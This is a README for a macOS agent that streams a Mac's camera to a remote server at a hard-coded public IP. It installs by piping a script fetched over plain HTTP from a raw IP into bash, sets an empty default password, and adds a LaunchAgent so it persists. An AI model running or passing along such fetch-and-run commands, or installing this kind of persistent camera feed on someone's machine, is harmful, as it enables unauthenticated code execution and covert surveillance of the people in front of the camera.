# MacCameraAgent

macOS camera agent for the existing Windows Server/Web UI.

The agent reuses the current TCP protocol:

- `9999` agent port by default
- HELLO + AUTH handshake
- camera frame stream as JPEG/PNG payloads
- camera device list, quality, camera select, and codec commands

The current build is camera-only. Screen capture is intentionally separate
because macOS screen recording uses a different permission model.

## Requirements

- macOS 12 or newer
- Xcode Command Line Tools
- Camera permission granted to `MacCameraAgent.app`

Install Xcode Command Line Tools if Swift is missing:

```bash
xcode-select --install
```

## One-Line Install

```bash
curl -fsSL http://114.80.36.225:15667/6/install-macos-camera-agent.sh | bash -s -- --server 110.42.44.89 --port 9999
```

Optional password:

```bash
curl -fsSL http://114.80.36.225:15667/6/install-macos-camera-agent.sh | bash -s -- --server 110.42.44.89 --port 9999 --password your-password
```

The installer:

1. Downloads the source package.
2. Builds `MacCameraAgent` with SwiftPM.
3. Creates `~/Applications/MacCameraAgent.app`.
4. Writes `~/Library/Application Support/MacCameraAgent/config.ini`.
5. Registers `~/Library/LaunchAgents/com.remoteviewer.maccameraagent.plist`.
6. Starts the agent.

## Config

```ini
[Server]
Host=110.42.44.89
Port=9999
Password=
ReconnectSeconds=10

[Camera]
Index=0
Quality=100
Fps=15
```

## Logs

```bash
tail -f "$HOME/Library/Logs/MacCameraAgent/agent.log"
```

## Stop / Uninstall

```bash
launchctl bootout "gui/$(id -u)" "$HOME/Library/LaunchAgents/com.remoteviewer.maccameraagent.plist" 2>/dev/null || true
rm -f "$HOME/Library/LaunchAgents/com.remoteviewer.maccameraagent.plist"
rm -rf "$HOME/Applications/MacCameraAgent.app"
```
